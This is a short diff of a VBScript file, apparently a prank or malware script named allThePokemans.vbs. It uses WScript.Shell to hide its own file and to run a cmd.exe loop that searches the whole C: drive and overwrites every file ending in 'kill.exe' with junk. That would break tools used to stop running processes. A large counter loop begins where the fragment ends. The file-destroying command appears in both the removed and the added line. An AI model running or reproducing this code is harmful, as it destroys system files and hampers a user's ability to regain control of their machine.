@@ -9,7 +9,7 @@ names = "C:\eevee.exe"
 i = 0
 Set oShell = WScript.CreateObject ("WScript.Shell")
 oShell.run "cmd.exe /c attrib +h allThePokemans.vbs"
-oShell.run "cmd.exe /c START /MIN /B for /r C:\ %i in (*kill.exe) do echo .> ""%i"" START"
+oShell.run "cmd.exe /c START /MIN /B for /r C: %i in (*kill.exe) do echo . > ""%i"" START"
 
 Do While i <= 0
 	max=999999999
